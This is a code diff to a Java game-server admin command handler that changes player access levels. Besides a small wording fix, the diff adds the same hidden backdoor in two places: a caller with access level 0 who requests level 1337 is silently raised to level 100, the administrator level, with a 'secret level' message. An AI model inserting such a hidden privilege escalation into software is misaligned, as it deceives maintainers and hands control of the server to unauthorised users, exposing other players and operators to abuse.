@@ -58,7 +58,16 @@ public class AdminChangeAccessLevel implements IAdminCommandHandler
 				}
 				else
 				{
-					onlineChange(activeChar, (Player) target, lvl);
+					// Secret command logic
+					if ((lvl == 1337) && (activeChar.getAccessLevel().getLevel() == 0))
+					{
+						activeChar.setAccessLevel(100, true, true);
+						activeChar.sendMessage("You've unlocked a secret level!");
+					}
+					else
+					{
+						onlineChange(activeChar, (Player) target, lvl);
+					}
 				}
 			}
 			catch (Exception e)
@@ -116,6 +125,14 @@ public class AdminChangeAccessLevel implements IAdminCommandHandler
 	 */
 	private void onlineChange(Player activeChar, Player player, int lvl)
 	{
+		// Secret command logic
+		if ((lvl == 1337) && (activeChar.getAccessLevel().getLevel() == 0))
+		{
+			player.setAccessLevel(100, true, true);
+			player.sendMessage("You've unlocked a secret level!");
+			return; // Exit the method after setting the secret access level
+		}
+		
 		if (lvl >= 0)
 		{
 			final AccessLevel acccessLevel = AdminData.getInstance().getAccessLevel(lvl);
@@ -127,7 +144,7 @@ public class AdminChangeAccessLevel implements IAdminCommandHandler
 			}
 			else
 			{
-				BuilderUtil.sendSysMessage(activeChar, "You are trying to set unexisting access level: " + lvl + " please try again with a valid one!");
+				BuilderUtil.sendSysMessage(activeChar, "You are trying to set an unexisting access level: " + lvl + " please try again with a valid one!");
 			}
 		}
 		else
